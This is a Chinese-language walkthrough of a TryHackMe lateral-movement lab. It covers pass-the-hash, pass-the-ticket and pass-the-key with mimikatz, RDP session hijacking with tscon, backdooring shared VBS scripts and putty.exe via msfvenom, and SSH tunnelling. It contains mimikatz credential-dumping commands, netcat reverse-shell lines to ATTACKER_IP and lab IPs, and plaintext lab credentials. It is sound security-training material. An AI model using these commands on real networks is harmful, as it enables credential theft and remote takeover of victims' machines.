<p>尽管我们似乎无法真正使用这些哈希值，但只需知道密码哈希值即可响应身份验证期间发送的 NTLM 质询。这意味着我们可以在不需要知道明文密码的情况下进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，则无需破解 NTLM 哈希值，我们就可以传递哈希值 (PtH) 并成功进行身份验证。</p>
<p>要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM 或直接从 LSASS 内存中提取哈希值。</p>
<h3 id="从本地-sam-中提取-ntlm-哈希值">从本地 SAM 中提取 NTLM 哈希值</h3>
<p>此方法仅允许您从计算机上的本地用户获取哈希值。没有域用户的哈希值可用。</p>
<pre><code class="hljs scss">mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : <span class="hljs-number">000001</span>f4 (<span class="hljs-number">500</span>)
User : Administrator
  Hash NTLM: <span class="hljs-number">145</span>e02c50333951f71d13c245d352b50</code></pre>
<h3 id="从-lsass-内存中提取-ntlm-哈希值">从 LSASS 内存中提取 NTLM 哈希值</h3>
<p>此方法将允许您提取本地用户和最近登录到计算机的任何域用户的任何 NTLM 哈希值。</p>
<pre><code class="hljs scss">mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">308124</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0004</span>b39c)
Session           : RemoteInteractive from <span class="hljs-number">2</span> 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : <span class="hljs-number">2022</span>/<span class="hljs-number">04</span>/<span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">55</span>:<span class="hljs-number">02</span>
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3330634377</span>-<span class="hljs-number">1326264276</span>-<span class="hljs-number">632209373</span>-<span class="hljs-number">4605</span>
        msv :
         [<span class="hljs-number">00000003</span>] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : <span class="hljs-number">6</span>b4a57f67805a663c818106dc0648484</code></pre>
<p>然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示：</p>
<pre><code class="hljs scss">mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:<span class="hljs-number">6</span>b4a57f67805a663c818106dc0648484 /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"</span></code></pre>
<p>请注意，我们使用 <code>token::revert</code> 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。</p>
<p>这相当于使用 <code>runas /netonly</code> 但使用哈希而不是密码，并将生成一个新的反向 shell，我们可以从其中以受害者用户身份启动任何命令。</p>
<p>要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器：</p>
<pre><code class="hljs scss">nc -lvp <span class="hljs-number">5555</span></code></pre>
<p>有趣的是，如果您在此 shell 上运行 whoami 命令，它仍然会显示您在执行 PtH 之前使用的原始用户，但从这里运行的任何命令实际上都会使用我们使用 PtH 注入的凭据。</p>
<h3 id="使用-linux-传递哈希">使用 Linux 传递哈希</h3>
<p>如果您可以访问 Linux 盒子（如 AttackBox），有几个工具具有内置支持，可以使用不同的协议执行 PtH。根据您可以使用的服务，您可以执行以下操作：</p>
<p>使用 PtH 连接到 RDP：</p>
<pre><code class="hljs scss">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</code></pre>
<p>使用 PtH 通过 psexec 连接：</p>
<pre><code class="hljs scss">psexec<span class="hljs-selector-class">.py</span> -hashes NTLM_HASH DOMAIN/MyUser<span class="hljs-keyword">@VICTIM</span>_IP</code></pre>
<p>注意：仅 Linux 版本的 psexec 支持 PtH。</p>
<p>使用 PtH 连接到 WinRM：</p>
<pre><code class="hljs scss">evil-winrm -<span class="hljs-selector-tag">i</span> VICTIM_IP -u MyUser -H NTLM_HASH</code></pre>
<h2 id="kerberos-身份验证">Kerberos 身份验证</h2>
<p>让我们快速了解一下 Kerberos 身份验证在 Windows 网络上的工作原理：</p>
<ol>
<li>
<p>用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心 (KDC)，该服务通常安装在域控制器上，负责在网络上创建 Kerberos 票证。</p>
<p>KDC 将创建并发回票证授予票证 (TGT)，允许用户请求票证来访问特定服务，而无需将其凭据传递给服务本身。与 TGT 一起，还将向用户提供会话密钥，用户将需要该会话密钥来生成后续请求。</p>
<p>请注意，TGT 使用 krbtgt 帐户的密码哈希进行加密，因此用户无法访问其内容。重要的是要知道加密的 TGT 包括会话密钥的副本作为其内容的一部分，并且 KDC 不需要存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本。</p>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png" alt="image-20240216150118868"></p>
<ol start="2">
<li>
<p>当用户想要连接到网络上的服务（例如共享、网站或数据库）时，他们将使用 TGT 向 KDC 请求票证授予服务 (TGS)。 TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送他的用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称 (SPN)，该名称指示我们打算访问的服务和服务器名称。</p>
<p>因此，KDC 将向我们发送 TGS 和服务会话密钥，我们需要对我们想要访问的服务进行身份验证。 TGS 使用服务所有者哈希进行加密。服务所有者是运行服务的用户或计算机帐户。 TGS 在其加密内容上包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png" alt="image-20240216150256426"></p>
<ol start="3">
<li>然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png" alt="image-20240216150326439"></p>
<h2 id="传票">传票</h2>
<p>有时可以使用 mimikatz 从 LSASS 内存中提取 Kerberos 票证和会话密钥。该过程通常需要我们在被攻击的机器上拥有 SYSTEM 权限，可以按如下方式完成：</p>
<pre><code class="hljs scss">mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export</code></pre>
<p>请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。</p>
<p>虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可用于请求访问允许用户访问的任何服务。同时，TGS 仅适用于特定服务。提取 TGT 需要我们拥有管理员凭据，并且可以使用低权限帐户（仅分配给该帐户的帐户）来提取 TGS。</p>
<p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话：</p>
<pre><code class="hljs scss">mimikatz # kerberos::ptt [<span class="hljs-number">0</span>;<span class="hljs-number">427</span>fcd5]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>e10000-Administrator<span class="hljs-keyword">@krbtgt-ZA</span>.TRYHACKME.COM.kirbi</code></pre>
<p>在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令：</p>
<pre><code class="hljs scss">za\bob<span class="hljs-selector-class">.jenkins</span><span class="hljs-keyword">@THMJMP</span>2 <span class="hljs-attribute">C</span>:\&gt; klist

Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x1e43562

Cached <span class="hljs-attribute">Tickets</span>: (<span class="hljs-number">1</span>)

#<span class="hljs-number">0</span>&gt;     <span class="hljs-attribute">Client</span>: Administrator @ ZA.TRYHACKME.COM
        <span class="hljs-attribute">Server</span>: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption <span class="hljs-attribute">Type</span>: AES-<span class="hljs-number">256</span>-CTS-HMAC-SHA1-<span class="hljs-number">96</span>
        Ticket Flags <span class="hljs-number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
        Start <span class="hljs-attribute">Time</span>: <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">0</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)
        End <span class="hljs-attribute">Time</span>:   <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)
        Renew <span class="hljs-attribute">Time</span>: <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">0</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)
        Session Key <span class="hljs-attribute">Type</span>: AES-<span class="hljs-number">256</span>-CTS-HMAC-SHA1-<span class="hljs-number">96</span>
        Cache <span class="hljs-attribute">Flags</span>: <span class="hljs-number">0</span>x1 -&gt; PRIMARY
        Kdc <span class="hljs-attribute">Called</span>: THMDC.za.tryhackme.com</code></pre>
<h2 id="跨越哈希传递密钥">跨越哈希/传递密钥</h2>
<p>这种攻击与 PtH 类似，但适用于 Kerberos 网络。</p>
<p>当用户请求 TGT 时，他们会发送使用从其密码派生的加密密钥加密的时间戳。用于派生此密钥的算法可以是 DES（在当前 Windows 版本上默认禁用）、RC4、AES128 或 AES256，具体取决于安装的 Windows 版本和 Kerberos 配置。如果我们拥有这些密钥中的任何一个，我们就可以向 KDC 请求 TGT，而无需实际密码，因此得名“传递密钥”(PtK)。</p>
<p>我们可以通过使用 mimikatz 和以下命令从内存中获取 Kerberos 加密密钥：</p>
<pre><code class="hljs scss">mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys</code></pre>
<p>根据可用的密钥，我们可以在 mimikatz 上运行以下命令，以通过密钥传递来获取反向 shell（为方便起见，THMJMP2 中已提供 <code>nc64</code> ）：</p>
<p>如果我们有 RC4 哈希：</p>
<pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:<span class="hljs-number">96</span>ea24eff4dff1fbe13818fbf12ea7d8 /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</span></code></pre>
<p>如果我们有 AES128 哈希：</p>
<pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</span></code></pre>
<p>如果我们有 AES256 哈希：</p>
<pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</span></code></pre>
<p>请注意，使用 RC4 时，密钥将等于用户的 NTLM 哈希值。这意味着，如果我们可以提取 NTLM 哈希，只要 RC4 是启用的协议之一，我们就可以使用它来请求 TGT。这种特殊的变体通常被称为 Overpass-the-Hash (OPtH)。</p>
<p>要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ nc -lvp <span class="hljs-number">5556</span></code></pre>
<p>就像 PtH 一样，从此 shell 运行的任何命令都将使用通过 mimikatz 注入的凭据。</p>
<h2 id="实践练习">实践练习</h2>
<p>要开始本练习，您需要使用以下凭据通过 SSH 连接到 THMJMP2：</p>
<p>用户：<a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t2_felicia.dean</p>
<p>Password：iLov3THM!</p>
<pre><code class="hljs scss">ssh za\\t2_felicia<span class="hljs-selector-class">.dean</span><span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com</code></pre>
<p>这些凭据将授予您对 THMJMP2 的管理访问权限，允许您使用 mimikatz 转储执行此任务期间提供的任何技术所需的身份验证材料。</p>
<p>使用 SSH 会话，使用 mimikatz 提取身份验证材料并针对域用户 <code>t1_toby.beck</code> 执行 Pass-the-Hash、Pass-the-Ticket 或 Pass-the-Key。</p>
<p>一旦您的命令提示符已加载其凭据，请使用 <code>winrs</code> 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据：</p>
<pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -r:THMIIS.za.tryhackme.com cmd</code></pre>
<p>您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 <code>mimikatz</code> 和 <code>psexec64</code> 均可在 THMJMP2 上的 <code>C:\tools</code> 处获取。</p>
<h3 id="pass-the-hash">Pass-the-Hash</h3>
<p>首先就是获取计算机上用户的哈希值：</p>
<pre><code class="hljs scss">privilege::debug
token::elevate
lsadump::sam或者sekurlsa::msv //我使用的后者</code></pre>
<p>接着找到目标用户<code>t1_toby.beck</code>对应的hash值，如下图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png" alt="image-20240216162531192"></p>
<p>然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示：</p>
<pre><code class="hljs scss">mimikatz # token::revert
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<span class="hljs-number">533</span>f1bd576caa912bdb9da284bbc60fe /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555"</span></code></pre>
<p>请注意，我们使用 <code>token::revert</code> 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png" alt="image-20240216162901279"></p>
<p>成功拿到shell，接着执行如下命令：</p>
<p>一旦您的命令提示符已加载其凭据，请使用 <code>winrs</code> 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据：</p>
<pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -r:THMIIS.za.tryhackme.com cmd</code></pre>
<p>您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 <code>mimikatz</code> 和 <code>psexec64</code> 均可在 THMJMP2 上的 <code>C:\tools</code> 处获取。</p>
<h3 id="pass-the-ticket">Pass-the-Ticket</h3>
<p>如果在目标机拥有管理员权限，则可以使用该方法：</p>
<pre><code class="hljs scss">privilege::debug
sekurlsa::tickets /export</code></pre>
<p>请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png" alt="image-20240216163656590"></p>
<p>如上图，我们获取到了目标用户的TGT票证。</p>
<p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话：</p>
<pre><code class="hljs scss">mimikatz # kerberos::ptt [<span class="hljs-number">0</span>;cd6dd]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>e10000-t1_toby<span class="hljs-selector-class">.beck</span><span class="hljs-keyword">@krbtgt-ZA</span>.TRYHACKME.COM.kirbi</code></pre>
<p>在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png" alt="image-20240216163752957"></p>
<p>可以看到我们成功注入会话，成功进入目标用户的shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png" alt="image-20240216163905893"></p>
<h3 id="pass-the-key">Pass-the-Key</h3>
<pre><code class="hljs scss">privilege::debug
sekurlsa::ekeys</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png" alt="image-20240216164334193"></p>
<p>可以看到目标用户可以使用aes256算法以及rc4，这里就用aes256了</p>
<pre><code class="hljs scss">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:<span class="hljs-number">6</span>a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:<span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555"</span></code></pre>
<p>这里也是成功拿到shell，不过恰好靶机重置了，没截到图，这里就算了</p>
<h1 id="0x06-滥用用户行为">0x06 滥用用户行为</h1>
<p>在某些情况下，攻击者可以利用用户执行的操作来进一步访问网络中的计算机。虽然发生这种情况的方式有很多种，但我们将讨论一些最常见的方式。</p>
<h2 id="滥用可写股份">滥用可写股份</h2>
<p>在检查公司环境时，经常会发现合法用户用来执行日常任务的网络共享。如果这些共享由于某种原因是可写的，攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限。</p>
<p>一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png" alt="image-20240216165339194"></p>
<p>其背后的基本原理是，管理员可以在网络共享上维护可执行文件，并且用户可以执行它，而无需将应用程序复制或安装到每个用户的计算机上。如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限，我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载。</p>
<p>尽管脚本或可执行文件托管在服务器上，但当用户在其工作站上打开快捷方式时，可执行文件将从服务器复制到其 <code>%temp%</code> 文件夹并在工作站上执行。因此，任何有效负载都将在最终用户工作站（和登录用户帐户）的上下文中运行。</p>
<h3 id="后门-vbs-脚本">后门 .vbs 脚本</h3>
<p>例如，如果共享资源是VBS脚本，我们可以将nc64.exe的副本放在同一个共享上，并在共享脚本中注入以下代码：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">CreateObject</span>("WScript.Shell")<span class="hljs-selector-class">.Run</span> "cmd<span class="hljs-selector-class">.exe</span> /c copy /Y \\<span class="hljs-number">10.10</span><span class="hljs-selector-class">.28</span><span class="hljs-selector-class">.6</span>\myshare\nc64<span class="hljs-selector-class">.exe</span> %tmp% &amp; %tmp%\nc64<span class="hljs-selector-class">.exe</span> -e cmd<span class="hljs-selector-class">.exe</span> &lt;attacker_ip&gt; <span class="hljs-number">1234</span>", <span class="hljs-number">0</span>, True</code></pre>
<p>这会将 nc64.exe 从共享复制到用户工作站 <code>%tmp%</code> 目录，并在用户打开共享 VBS 脚本时向攻击者发送反向 shell。</p>
<h3 id="exe-文件后门">.exe 文件后门</h3>
<p>如果共享文件是 Windows 二进制文件，例如 putty.exe，您可以从共享下载它并使用 msfvenom 向其中注入后门。该二进制文件仍将照常工作，但会静默执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">a</span> x64 <span class="hljs-attr">--platform</span> windows -x putty<span class="hljs-selector-class">.exe</span> -k -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> "\x00" -f exe -o puttyX<span class="hljs-selector-class">.exe</span></code></pre>
<p>生成的 puttyX.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。文件生成后，我们可以替换 Windows 共享上的可执行文件，并使用 Metasploit 中的exploit/multi/handler 模块等待任何连接。</p>
<h3 id="rdp劫持">RDP劫持</h3>
<p>当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有系统权限，则无需密码即可接管任何现有 RDP 会话。</p>
<p>如果我们有管理员级别的访问权限，我们可以通过我们喜欢的任何方法获取 SYSTEM。现在，我们将使用 psexec 来执行此操作。首先，让我们以管理员身份运行 cmd.exe：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png" alt="image-20240216165820771"></p>
<p>从那里运行 <code>PsExec64.exe</code> （可在 <code>C:\tools\</code> 处获取）：</p>
<pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span></code></pre>
<p>要列出服务器上现有的会话，可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#<span class="hljs-number">6</span>           <span class="hljs-number">2</span>  Active          .  <span class="hljs-number">4</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">09</span> AM
 luke                                    <span class="hljs-number">3</span>  Disc            .  <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">51</span> AM</code></pre>
<p>根据上面的命令输出，如果我们当前使用管理员用户通过 RDP 连接，我们的 SESSIONNAME 将为 <code>rdp-tcp#6</code> 。我们还可以看到名为 luke 的用户打开了一个 ID 为 <code>3</code> 的会话。任何具有光盘状态的会话都已被用户保持打开状态，并且目前未被使用。虽然您也可以接管活动会话，但当您这样做时，合法用户将被迫退出其会话，他们可能会注意到这一点。</p>
<p>要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p>
<pre><code class="hljs scss">tscon <span class="hljs-number">3</span> /dest:rdp-tcp#<span class="hljs-number">6</span></code></pre>
<p>简单来说，该命令指出 luke 拥有的图形会话 <code>3</code> 应与管理员用户拥有的 RDP 会话 <code>rdp-tcp#6</code> 连接。</p>
<p>因此，我们将恢复 Luke 的 RDP 会话并立即连接到它。</p>
<p>注意：Windows Server 2019 不允许您在不知道密码的情况下连接到其他用户的会话。</p>
<h2 id="实践练习">实践练习</h2>
<p>要完成此练习，您需要使用从 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds_t2">http://distributor.za.tryhackme.com/creds_t2</a> 获取的一组新凭据连接到 THMJMP2（请注意，此链接与其他任务不同）。获得凭据后，通过 RDP 连接到 THMJMP2：</p>
<pre><code class="hljs scss">xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384</code></pre>
<p>这些凭据将授予您对 THMJMP2 的管理访问权限。</p>
<p>对于此任务，我们将劫持 RDP 会话。如果您有兴趣尝试在 exe 或其他文件中添加后门，您可以在 Windows 本地持久性室中找到一些与此相关的练习。</p>
<p>按照说明劫持 t1_toby.beck 在 THMJMP2 上的 RDP 会话以获取您的标志。</p>
<p>注意：执行 <code>query session</code> 时，您将看到几个名为 t1_toby.beck 的用户，后跟一个数字。这些只是同一用户的相同副本，您可以劫持其中任何一个（您不需要劫持全部）。确保劫持标记为已断开连接的会话（光盘）以避免干扰其他用户。</p>
<p>当我们以管理员打开cmd之后运行如下命令：</p>
<pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span></code></pre>
<p>接着列出服务器上所有的会话：</p>
<pre><code class="hljs scss">query user</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png" alt="image-20240216202509233"></p>
<p>要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p>
<pre><code class="hljs scss">tscon <span class="hljs-number">4</span> /dest:rdp-tcp#<span class="hljs-number">27</span></code></pre>
<p>简单来说，该命令指出<code> t1_toby.beck</code> 拥有的图形会话 <code>4</code> 应与管理员用户拥有的 RDP 会话 <code>rdp-tcp#27</code> 连接。</p>
<p>如下图成功窃取到会话</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png" alt="image-20240216202415931"></p>
<h1 id="0x07-端口转发">0x07 端口转发</h1>
<p>我们提出的大多数横向移动技术都需要特定端口可供攻击者使用。在现实网络中，管理员可能出于安全原因阻止了其中一些端口，或者在网络周围实施了分段，从而阻止您访问 SMB、RDP、WinRM 或 RPC 端口。</p>
<p>为了绕过这些限制，我们可以使用端口转发技术，其中包括使用任何受感染的主机作为跳转盒来转向其他主机。预计某些机器将比其他机器拥有更多的网络权限，因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求。</p>
<h2 id="ssh-隧道">SSH 隧道</h2>
<p>我们要研究的第一个协议是 SSH，因为它已经具有通过称为 SSH 隧道的功能进行端口转发的内置功能。虽然 SSH 曾经是与 Linux 系统相关的协议，但 Windows 现在默认附带 OpenSSH 客户端，因此您可以在当今的许多系统中找到它，而与操作系统无关。</p>
<p>SSH 隧道可以以不同的方式使用，通过 SSH 连接转发端口，我们将根据情况使用它。为了解释每种情况，我们假设一个场景，我们已经获得了对 PC-1 机器的控制权（不需要管理员访问权限），并且希望将其用作访问另一台机器上的端口的枢纽。我们无法直接连接。我们将启动一条从 PC-1 计算机（充当 SSH 客户端）到攻击者 PC（充当 SSH 服务器）的隧道。这样做的原因是，您经常会在 Windows 计算机上找到 SSH 客户端，但大多数时候没有可用的 SSH 服务器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png" alt="image-20240216203013265"></p>
<p>由于我们将连接回攻击者的计算机，因此我们希望在其中创建一个用户，而无需访问任何隧道控制台，并设置用于创建隧道的密码：</p>
<pre><code class="hljs scss">useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser</code></pre>
<p>根据您的需要，SSH 隧道可用于执行本地或远程端口转发。让我们看一下每个案例。</p>
<h2 id="ssh-远程端口转发">SSH 远程端口转发</h2>
<p>在我们的示例中，假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口 3389。如果攻击者之前已入侵 PC-1，并且 PC-1 可以访问服务器的端口 3389，则可以使用 PC-1 的远程端口转发将其转移到端口 3389。远程端口转发允许您从 SSH 客户端（在本例中为 PC-1）获取可访问的端口，并将其投射到远程 SSH 服务器（攻击者的计算机）中。</p>
<p>结果，攻击者的计算机上将打开一个端口，可用于通过 SSH 隧道连接回服务器中的端口 3389。反过来，PC-1 将代理连接，以便服务器将看到所有流量，就好像它来自 PC-1 一样：</p>
